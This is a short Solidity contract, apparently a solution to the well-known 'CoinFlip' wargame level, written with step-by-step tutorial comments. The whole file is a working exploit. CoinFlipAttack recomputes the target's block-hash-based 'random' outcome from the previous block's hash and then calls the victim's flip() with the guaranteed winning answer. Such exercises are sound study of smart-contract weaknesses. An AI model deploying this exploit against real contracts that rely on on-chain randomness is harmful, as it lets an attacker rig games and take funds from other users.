//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

//1.- We need the code of the original contract:
import "./CoinFlip.sol";

import "hardhat/console.sol";

contract CoinFlipAttack {
    //2.- Put the target contract into a var
    CoinFlip public victimContract;
    //3.- Need all the constant of the target contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //4.-In the constructor, we match the code with the address
    constructor (address _victimContractAddr) {
        victimContract = CoinFlip(_victimContractAddr);
    }

    //5.- We call de target contract:
    //5.1.- We simulate the same code -> we obtain the answer (true, false)
    function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = (blockValue/FACTOR);

    bool side = coinFlip == 1 ? true : false;

    //5.2.- We pass that answer to the target contract
    victimContract.flip(side);
    }




}